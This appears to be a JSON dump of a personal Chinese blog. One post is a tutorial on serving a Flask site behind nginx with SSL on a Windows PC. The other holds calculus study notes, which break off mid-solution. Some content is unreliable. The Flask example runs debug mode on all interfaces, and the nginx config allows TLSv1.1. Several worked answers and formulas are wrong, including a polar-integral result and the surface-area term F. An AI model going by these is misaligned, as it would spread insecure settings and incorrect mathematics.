function_\">quit</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        obj = Popen(<span class=\"string\">&quot;nginx -s quit&quot;</span>,cwd=self.path, shell=<span class=\"literal\">True</span>, stdout=PIPE, stderr=PIPE)  </span><br><span class=\"line\">        out_info, out_error = obj.communicate()</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (out_info, out_error)</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">reload</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        obj = Popen(<span class=\"string\">&quot;nginx -s reload&quot;</span>,cwd=self.path, shell=<span class=\"literal\">True</span>, stdout=PIPE, stderr=PIPE)  </span><br><span class=\"line\">        out_info, out_error = obj.communicate()</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (out_info, out_error)</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">restart</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        obj = Popen(<span class=\"string\">&quot;nginx -s reopen&quot;</span>,cwd=self.path, shell=<span class=\"literal\">True</span>, stdout=PIPE, stderr=PIPE)  </span><br><span class=\"line\">        out_info, out_error = obj.communicate()</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (out_info, out_error)</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">killall</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        pids = psutil.pids()</span><br><span class=\"line\">        <span class=\"keyword\">for</span> pid <span class=\"keyword\">in</span> pids:</span><br><span class=\"line\">            p = psutil.Process(pid)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> p.name() == <span class=\"string\">&#x27;nginx.exe&#x27;</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(pid)</span><br><span class=\"line\">                p.kill()</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">status</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        pids = psutil.pids()</span><br><span class=\"line\">        nginxpid=[]</span><br><span class=\"line\">        <span class=\"keyword\">for</span> pid <span class=\"keyword\">in</span> pids:</span><br><span class=\"line\">            p = psutil.Process(pid)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> p.name() == <span class=\"string\">&#x27;nginx.exe&#x27;</span>:</span><br><span class=\"line\">                nginxpid.append(pid)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(nginxpid)==<span class=\"number\">0</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span>(<span class=\"string\">&#x27;Nginx未运行&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span>(<span class=\"string\">&#x27;%d 个Nginx进程正在运行中&#x27;</span> % <span class=\"built_in\">len</span>(nginxpid))</span><br></pre></td></tr></table></figure>\n\n<p>nginx.conf 文件(即 Nginx 配置文件，位于 Nginx 的 conf 目录下)的 server 配置如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">        listen 80;</span><br><span class=\"line\">        server_name example.com;</span><br><span class=\"line\">        location / &#123;</span><br><span class=\"line\">            proxy_pass http://127.0.0.1:5000;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>proxy_pass</code> 后面那个地址必须是本地能访问的，此时我已经将上面python代码中的 <code>host=&#39;0.0.0.0&#39;</code> 删掉了。<br><code>server_name</code> 后面填写域名，记得要先添加 A 记录到局域网 ip ，我为了图方便直接添加了泛域名解析(即 <code>*.example.com</code> )。</p>\n<h3 id=\"SSL-证书\"><a href=\"#SSL-证书\" class=\"headerlink\" title=\"SSL 证书\"></a>SSL 证书</h3><h4 id=\"证书申请\"><a href=\"#证书申请\" class=\"headerlink\" title=\"证书申请\"></a>证书申请</h4><p>由于个人有一丢丢强迫症，看到浏览器 http 的不安全提示总是有点膈应，就想着部署个 SSL 证书解决。然而，其中过程非常麻烦，我最终还是在阿里租的服务器上用宝塔申请了个 Let’s Encrypt 证书(免费的，白嫖永不过时)，然后一开始浏览器竟然显示证书是我那个服务器用的域名，折腾了两下换回去又好了，也是莫名其妙的。</p>\n<blockquote>\n<p><em>更新：</em><br><a href=\"https://letsencrypt.osfipin.com/\">https://letsencrypt.osfipin.com/</a><br>这个网站似乎不错</p>\n</blockquote>\n<h4 id=\"一些问题\"><a href=\"#一些问题\" class=\"headerlink\" title=\"一些问题\"></a>一些问题</h4><p>DNS 的验证逻辑非常奇怪，建议添加 TXT 记录后<strong>等待 10 分钟</strong>左右再提交验证申请(我就是栽了几次都验证失败，浪费好多时间)。同时我在 Windows 用 Certbot 申请的时候出现了写入权限的错误，也是莫名其妙的，既然日志文件都能写在目录下，证书却写不了。</p>\n<h4 id=\"Nginx-配置\"><a href=\"#Nginx-配置\" class=\"headerlink\" title=\"Nginx 配置\"></a>Nginx 配置</h4><p>如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen 80;</span><br><span class=\"line\">    listen 443 ssl http2;</span><br><span class=\"line\">    listen [::]:443 ssl http2;</span><br><span class=\"line\">    server_name example.com;</span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        proxy_pass http://127.0.0.1:5000;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    # 强制使用 HTTPS，可选</span><br><span class=\"line\">    # if ($server_port !~ 443) &#123;</span><br><span class=\"line\">    #     rewrite ^(/.*)$ https://$host$1 permanent;</span><br><span class=\"line\">    # &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3;</span><br><span class=\"line\">    ssl_certificate 证书文件路径;</span><br><span class=\"line\">    ssl_certificate_key 私钥文件路径;</span><br><span class=\"line\"></span><br><span class=\"line\">    ssl_session_cache shared:SSL:1m;</span><br><span class=\"line\">    ssl_session_timeout 5m;</span><br><span class=\"line\"></span><br><span class=\"line\">    ssl_ciphers HIGH:!aNULL:!MD5;</span><br><span class=\"line\">    ssl_prefer_server_ciphers on;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","excerpt":"<p>在学校里用自己电脑( Windows10 环境)当服务器搭了个网站，仅可在校园网下访问，图一乐。</p>","more":"<h2 id=\"基础\"><a href=\"#基础\" class=\"headerlink\" title=\"基础\"></a>基础</h2><h3 id=\"安装-flask-框架\"><a href=\"#安装-flask-框架\" class=\"headerlink\" title=\"安装 flask 框架\"></a>安装 flask 框架</h3><p>Flask 是一个好用且简单的 web 框架，更多操作可以参考 <a href=\"https://flask.palletsprojects.com/\">Flask官网</a>。<br><code>pip install flask</code><br>当然前提得先装好 python ，不提。<br>在 VSCode 下可以直接用 Code runner 运行下面代码。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask</span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">index</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&#x27;Hello World!&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    app.run(</span><br><span class=\"line\">        host=<span class=\"string\">&#x27;0.0.0.0&#x27;</span>, <span class=\"comment\"># 加了这个参数局域网内部才可以通过本机ip访问</span></span><br><span class=\"line\">        port=<span class=\"number\">5000</span>,  <span class=\"comment\"># 端口也可以设成80，访问的时候不用加端口号</span></span><br><span class=\"line\">        debug=<span class=\"literal\">True</span>, <span class=\"comment\"># 开启调试模式，可以实时监控代码更改</span></span><br><span class=\"line\">    )</span><br></pre></td></tr></table></figure>\n\n<p>这样，一个基础的网页就搭建好了，在同一个局域网用浏览器访问 <code>http://&lt;你电脑的内网IP&gt;:5000</code> 就能看到 <code>Hello World!</code> 了。<br>但是我在连着无线网的笔记本部署却不能访问，也 ping 不通笔记本的 ip ，其中原因有待细究。</p>\n<blockquote>\n<p>更新：无线网无法访问是因为学校防挖矿病毒，把低端口封了。</p>\n</blockquote>\n<h2 id=\"进阶\"><a href=\"#进阶\" class=\"headerlink\" title=\"进阶\"></a>进阶</h2><h3 id=\"Nginx\"><a href=\"#Nginx\" class=\"headerlink\" title=\"Nginx\"></a>Nginx</h3><p>有域名的可以下个 Nginx 玩，体验感高很多(bushi)。<br>Nginx 下载地址 <a href=\"http://nginx.org/en/download.html\">http://nginx.org/en/download.html</a><br>建议下载稳定版的，即 <code>Stable version</code> 。<br>下载后直接解压即可，<strong>不要双击 Nginx.exe</strong>。用终端打开 Nginx 的目录，然后使用命令 <code>start nginx</code> 运行。<br>以下是一些 Nginx 的常用命令：( Windows 下没有添加环境变量的情况下 nginx 需要换成 <code>./nginx xxx</code> )</p>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nginx -s reload # 重载配置文件，更改配置文件后记得重载</span><br><span class=\"line\">nginx -s reopen # 重启Nginx</span><br><span class=\"line\">nginx -s stop   # 强行停止Nginx</span><br><span class=\"line\">nginx -s quit   # 正常退出Nginx</span><br></pre></td></tr></table></figure>\n\n<p>有个小坑就是有时不一定能通过上面的两个命令停止 Nginx ，这时在任务管理器是能看见 Nginx 的进程还在的，需要手动杀掉，否则可能无法正常重载配置文件(即 <code>config</code> 文件)。<br>同时觉得用命令行太麻烦了，就写了个 Python 的脚本配合 Flask 操作，如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> subprocess <span class=\"keyword\">import</span> Popen, PIPE</span><br><span class=\"line\"><span class=\"keyword\">import</span> psutil</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Nginx</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, path</span>):</span><br><span class=\"line\">        self.path = path    <span class=\"comment\"># Nginx的目录(绝对路径)</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">start</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        obj = Popen(<span class=\"string\">&quot;start nginx&quot;</span>,cwd=self.path, shell=<span class=\"literal\">True</span>, stdout=PIPE, stderr=PIPE)</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">quit</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        obj = Popen(<span class=\"string\">&quot;nginx -s quit&quot;</span>,cwd=self.path, shell=<span class=\"literal\">True</span>, stdout=PIPE, stderr=PIPE)  </span><br><span class=\"line\">        out_info, out_error = obj.communicate()</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (out_info, out_error)</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">reload</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        obj = Popen(<span class=\"string\">&quot;nginx -s reload&quot;</span>,cwd=self.path, shell=<span class=\"literal\">True</span>, stdout=PIPE, stderr=PIPE)  </span><br><span class=\"line\">        out_info, out_error = obj.communicate()</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (out_info, out_error)</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">restart</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        obj = Popen(<span class=\"string\">&quot;nginx -s reopen&quot;</span>,cwd=self.path, shell=<span class=\"literal\">True</span>, stdout=PIPE, stderr=PIPE)  </span><br><span class=\"line\">        out_info, out_error = obj.communicate()</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (out_info, out_error)</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">killall</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        pids = psutil.pids()</span><br><span class=\"line\">        <span class=\"keyword\">for</span> pid <span class=\"keyword\">in</span> pids:</span><br><span class=\"line\">            p = psutil.Process(pid)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> p.name() == <span class=\"string\">&#x27;nginx.exe&#x27;</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(pid)</span><br><span class=\"line\">                p.kill()</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">status</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        pids = psutil.pids()</span><br><span class=\"line\">        nginxpid=[]</span><br><span class=\"line\">        <span class=\"keyword\">for</span> pid <span class=\"keyword\">in</span> pids:</span><br><span class=\"line\">            p = psutil.Process(pid)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> p.name() == <span class=\"string\">&#x27;nginx.exe&#x27;</span>:</span><br><span class=\"line\">                nginxpid.append(pid)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(nginxpid)==<span class=\"number\">0</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span>(<span class=\"string\">&#x27;Nginx未运行&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span>(<span class=\"string\">&#x27;%d 个Nginx进程正在运行中&#x27;</span> % <span class=\"built_in\">len</span>(nginxpid))</span><br></pre></td></tr></table></figure>\n\n<p>nginx.conf 文件(即 Nginx 配置文件，位于 Nginx 的 conf 目录下)的 server 配置如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">        listen 80;</span><br><span class=\"line\">        server_name example.com;</span><br><span class=\"line\">        location / &#123;</span><br><span class=\"line\">            proxy_pass http://127.0.0.1:5000;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>proxy_pass</code> 后面那个地址必须是本地能访问的，此时我已经将上面python代码中的 <code>host=&#39;0.0.0.0&#39;</code> 删掉了。<br><code>server_name</code> 后面填写域名，记得要先添加 A 记录到局域网 ip ，我为了图方便直接添加了泛域名解析(即 <code>*.example.com</code> )。</p>\n<h3 id=\"SSL-证书\"><a href=\"#SSL-证书\" class=\"headerlink\" title=\"SSL 证书\"></a>SSL 证书</h3><h4 id=\"证书申请\"><a href=\"#证书申请\" class=\"headerlink\" title=\"证书申请\"></a>证书申请</h4><p>由于个人有一丢丢强迫症，看到浏览器 http 的不安全提示总是有点膈应，就想着部署个 SSL 证书解决。然而，其中过程非常麻烦，我最终还是在阿里租的服务器上用宝塔申请了个 Let’s Encrypt 证书(免费的，白嫖永不过时)，然后一开始浏览器竟然显示证书是我那个服务器用的域名，折腾了两下换回去又好了，也是莫名其妙的。</p>\n<blockquote>\n<p><em>更新：</em><br><a href=\"https://letsencrypt.osfipin.com/\">https://letsencrypt.osfipin.com/</a><br>这个网站似乎不错</p>\n</blockquote>\n<h4 id=\"一些问题\"><a href=\"#一些问题\" class=\"headerlink\" title=\"一些问题\"></a>一些问题</h4><p>DNS 的验证逻辑非常奇怪，建议添加 TXT 记录后<strong>等待 10 分钟</strong>左右再提交验证申请(我就是栽了几次都验证失败，浪费好多时间)。同时我在 Windows 用 Certbot 申请的时候出现了写入权限的错误，也是莫名其妙的，既然日志文件都能写在目录下，证书却写不了。</p>\n<h4 id=\"Nginx-配置\"><a href=\"#Nginx-配置\" class=\"headerlink\" title=\"Nginx 配置\"></a>Nginx 配置</h4><p>如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen 80;</span><br><span class=\"line\">    listen 443 ssl http2;</span><br><span class=\"line\">    listen [::]:443 ssl http2;</span><br><span class=\"line\">    server_name example.com;</span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        proxy_pass http://127.0.0.1:5000;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    # 强制使用 HTTPS，可选</span><br><span class=\"line\">    # if ($server_port !~ 443) &#123;</span><br><span class=\"line\">    #     rewrite ^(/.*)$ https://$host$1 permanent;</span><br><span class=\"line\">    # &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3;</span><br><span class=\"line\">    ssl_certificate 证书文件路径;</span><br><span class=\"line\">    ssl_certificate_key 私钥文件路径;</span><br><span class=\"line\"></span><br><span class=\"line\">    ssl_session_cache shared:SSL:1m;</span><br><span class=\"line\">    ssl_session_timeout 5m;</span><br><span class=\"line\"></span><br><span class=\"line\">    ssl_ciphers HIGH:!aNULL:!MD5;</span><br><span class=\"line\">    ssl_prefer_server_ciphers on;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"高数下笔记","date":"2022-08-07T11:50:00.000Z","_content":"\n挂科了，还是要学好高数啊！\n<!--more-->\n\n## 前言\n\n玩脱了，光顾着搞技术，绩点炸了。\n高数 59 ，有人问我说我是不是得罪老师了——但是有没有一种可能，就是。。平时分已经给满了（）\n\n## 笔记正文\n\n### 第六章 多元函数微分学\n\n#### 1. 多元函数\n\n#### 2. 多元函数的极限\n\n#### 3. 多元函数的连续性\n\n#### 4. 偏导数与全微分\n\n**例**（2020-2021第二学期期末，1）确定实数 $\\alpha$ 的范围，使函数 $f(x,y)=\\left\\\\{\n\\begin{aligned}\n    (x^2+y^2)^\\alpha\\sin\\frac{1}{x^2+y^2},x^2+y^2\\neq0 \\\\\\\\\n    0,x^2+y^2\\neq0\n\\end{aligned}\n\\right.$ 在 $(0,0)$ 处可微。\n**解**\n$$\n\\lim_{x\\rightarrow0}\\frac{f(x,0)-f(0,0)}{x-0}=\\lim_{x\\rightarrow0}\\frac{x^{2\\alpha}\\sin\\frac{1}{x^2}}{x}=\\lim_{x\\rightarrow0}x^{2\\alpha-1}\\sin\\frac{1}{x^2}\n$$\n当 $2\\alpha-1>0$ 时，极限为 $0$ ，即 $f_x'(0,0)=0$ ，此时类似地，有 $f_y'(0,0)=0$\n\n#### 5. 复合函数与隐函数的微分法\n\n#### 6. 方向导数与梯度\n\n#### 7. 多元函数的微分中值定理与泰勒公式\n\n#### 8. 隐函数存在定理\n\n#### 9. 极值问题\n\n先用 $f_x'=f_y'=0$ 求出稳定点，再令 $A=f_{xx},B=f_{xy},C=f_{yy}$ ，仅 $B^2 < AC$ 时可以确定极值，此时 $A>0$ 就是极小值， $A < 0$ 就是极大值。与二元函数类似。\n\n**例**（2021-2022第二学期期末，4）求多元函数 $f(x,y)=xe^{-\\frac{x^2+y^2}{2}}$ 的极值。\n**解** $f_x'=e^{-\\frac{x^2+y^2}{2}}(1-x^2),f_y'=e^{-\\frac{x^2+y^2}{2}}(-xy)$ ，令 $f_x'=f_y'=0$ ，得到 $(-1,0)$ 和 $(1,0)$ 两个稳定点。令 $A=f_{xx}=e^{-\\frac{x^2+y^2}{2}}(x^3-3x),B=f_{xy}=e^{-\\frac{x^2+y^2}{2}}(-y+x^2y),C=f_{yy}=e^{-\\frac{x^2+y^2}{2}}(-x+xy^2)$ ，代入 $(1,0)$ 得到 $A=-2e^{-\\frac{1}{2}}<0$，$B=0$\n\n### 第七章 重积分\n\n#### 1. 二重积分的概念与性质\n\n#### 2. 二重积分的计算\n\n**例**（2021-2022第二学期期末，2）求 $I=\\int_0^1\\mathrm{d}x\\int_0^{\\sqrt{1-x^2}}(x^2+y^2)\\mathrm{d}y$\n**解** 作极坐标变换 $x=r\\cos\\theta,y=r\\sin\\theta$，则\n$$\nI = \\int_0^{\\frac{\\pi}{4}}\\mathrm{d}\\theta\\int_0^1 r\\cdot r\\mathrm{d}r = \\frac{\\pi}{12}\n$$\n**例**（2017-2018第二学期期末，1）计算二重积分 $\\iint_D\\frac{|y|}{x^2+y^2}\\mathrm{d}x\\mathrm{d}y$，其中 $D$ 为圆环区域 $1\\leq x^2+y^2\\leq 4$。\n**解** 作极坐标变换，有\n$$\nI = \\int_0^{2\\pi}\\mathrm{d}\\theta\\int_1^2 \\frac{|r\\sin\\theta|}{r^2}\\cdot\\mathrm{d}r = \\int_0^{2\\pi}|\\sin\\theta|\\mathrm{d}\\theta\\int_1^2\\mathrm{d}r = 4\\int_0^{\\frac{\\pi}{2}}\\sin\\theta \\mathrm{d}\\theta\\int_1^2\\mathrm{d}r = 4\n$$\n\n#### 3. 三重积分的概念与计算\n\n#### 4. 重积分的应用举例\n\n曲面 $S$ 由参数方程 $x=x(u,v),y=y(u,v),z=z(u,v), (u,v)\\in D'$ 给出时，可计算\n$$\nE = x_u^2+y_u^2+z_u^2 \\\\\\\\\nF = x_ux_v+y_ux_v+z_ux_v \\\\\\\\\nG = x_v^2+y_v^2+z_v^2\n$$\n从而\n$$\nS = \\iint\\limits_{D'}\\sqrt{EG-F^2}\\mathrm{d}u\\mathrm{d}v\n$$\n\n### 第八章 曲线积分与曲面积分\n\n#### 1. 第一型曲线积分（对弧长的曲线积分）\n\n这个非常地简单直观，就是求一条曲线（如二次函数的某一段）的长度。\n平面曲线求法：\n$$\n\\int_Lf(x,y)ds=\\int_\\alpha^\\beta f[x(t),y(t)]\\sqrt{[x'(t)]^2+[y'(t)]^2}dt \\\\\\\\\nor \\int_Lf(x,y)ds=\\int_\\alpha^\\beta f[x,y(x)]\\sqrt{[1+[y'(x)]^2}dxdy\n$$\n空间曲线类似：\n$$\n\\int_Lf(x,y,z)ds=\\int_\\alpha^\\beta f[x(t),y(t),z(t)]\\sqrt{[x'(t)]^2+[y'(t)]^2+[z'(t)]^2}dt \\\\\\\\\n$$\n\n#### 2. 第二型曲线积分（对坐标的曲线积分）\n\n这个看起来就不那么地直观，其物理背景是求变力在曲线上做功，大概想象一下子。\n计算方法：\n$$\n\\int_{\\overset{\\frown}{AB}}P(x,y)dx=\\int_\\alpha^\\beta P[x(t),y(t)]x'(t)dt \\\\\\\\\n\\int_{\\overset{\\frown}{AB}}Q(x,y)dy=\\int_\\alpha^\\beta Q[x(t),y(t)]y'(t)dt\n$$\n两类曲线积分关系：\n$$\n\\int_LPdx+Qdy=\\int_L(Pcos\\alpha +Qcos\\beta )ds \\\\\\\\\nor \\int_\\Gamma Pdx+Qdy+Rdz=\\int_L(Pcos\\alpha +Qcos\\beta +Rcos\\gamma )ds\n$$\n\n#### 3. 格林公式\n\n就一道式子：\n$$\n∮_L Pdx+Qdy=∬\\limits_D( \\frac{ \\partial Q }{ \\partial x }- \\frac{ \\partial P }{ \\partial y })dxdy\\\\\\\\\n$$\n条件是函数 $P$ 和 $Q$ 在平面区域 $D$ 上有连续的偏导数 ~~，这个条件一般不管，~~ 主要是**边界曲线 $L$ 闭合**就行。\n格林公式可以将**第二类曲线积分**化为简单的二重积分，非常地不错。\n> PS:以下这些符号的 Latex 支持不是很好，直接用字符了。\n$$\n∮ \\ ∯ \\ ∰ \\ ∱ \\ ∲ \\ ∳\n$$\n\n**例**（2020-2021第二学期期末，2）计算曲线积分 $∮_L(xy^2-\\sin y)\\mathrm{d}y-(\\cos x+x^2y)\\mathrm{d}x$ ，其中 $L$ 为圆周 $x^2+y^2=4$ ，积分方向为沿 $L$ 逆时针方向。\n**解** $L$ 为闭合曲线，且 $P,Q$ 在 $L$ 围成的 $D$ 上偏导也连续，所以可以用格林公式：\n$$\n\\begin{aligned}\nI&=\\iint\\limits_D[y^2-(-x^2)]\\mathrm{d}x\\mathrm{d}y \\\\\\\\\n&=\\int_0^{2\\pi}\\mathrm{d}\\theta\\int_0^2r^2\\cdot r\\mathrm{d}r \\\\\\\\\n&=8\\pi\n\\end{aligned}\n$$\n\n#### 4. 第一型曲面积分\n\n和第一型曲线积分一样直观，就是求一个曲面的面积。\n计算方法：\n$$\n\\iint \\limits_{\\Sigma} f(x,y,z) \\mathrm{d}S=\\iint \\limits_{D_{xy}}f[x,y,z(x,y)]\\sqrt{1+(\\frac{\\partial z}{\\partial x})^2+(\\frac{\\partial z}{\\partial y})^2}\\mathrm{d}x\\mathrm{d}y\n$$\n\n#### 5. 第二型曲面积分\n\n计算方法：\n$$\n\\iint \\limits_{\\Sigma} R(x,y,z) \\mathrm{d}S=\\iint \\limits_{D_{xy}}R[x,y,z(x,y)]\\mathrm{d}x\\mathrm{d}y\n$$\n\n两类曲面积分关系：\n$$\n\\iint \\limits_\\Sigma P\\mathrm{d}y\\mathrm{d}z+Q\\mathrm{d}x\\mathrm{d}z+R\\mathrm{d}x\\mathrm{d}y=\\iint \\limits_\\Sigma(Pcos\\alpha+Qcos\\beta+Rcos\\gamma)\\mathrm{d}S\n$$\n\n#### 6. 高斯公式与斯托克斯公式\n\n**高斯公式**：\n$$\n∯ \\limits_\\Sigma P\\mathrm{d}y\\mathrm{d}z+Q\\mathrm{d}x\\mathrm{d}z+R\\mathrm{d}x\\mathrm{d}y=\\iiint \\limits_\\Omega(\\frac{\\partial P}{\\partial x}+\\frac{\\partial Q}{\\partial y}+\\frac{\\partial R}{\\partial z})\\mathrm{d}x\\mathrm{d}y\\mathrm{d}z \\\\\\\\\nor ∯ \\limits_\\Sigma(P\\mathrm{cos}\\alpha+Q\\mathrm{cos}\\beta+R\\mathrm{cos}\\gamma)\\mathrm{d}S=\\iiint \\limits_\\Omega(\\frac{\\partial P}{\\partial x}+\\frac{\\partial Q}{\\partial y}+\\frac{\\partial R}{\\partial z})\\mathrm{d}x\\mathrm{d}y\\mathrm{d}z\n$$\n**例**（2021-2022第二学期期末，3）计算曲面积分 $∯ \\limits_\\Sigma(x-z)\\mathrm{d}y\\mathrm{d}z+z\\mathrm{d}x\\mathrm{d}y$ ，其中 $\\Sigma$ 是由 $z=x^2+2y^2$ 与 $z=1$ 所围成立体表面的外侧。\n**解** $\\Sigma$ 是封闭曲面，直接上高斯公式，有\n$$\nI=\\iiint \\limits_\\Omega(1+1)\\mathrm{d}x\\mathrm{d}y\\mathrm{d}z=2\\iiint \\limits_\\Omega\\mathrm{d}V\n$$\n作柱面坐标变换 $x=r\\cos\\theta,y=\\frac{r\\sin\\theta}{\\sqrt2}$ 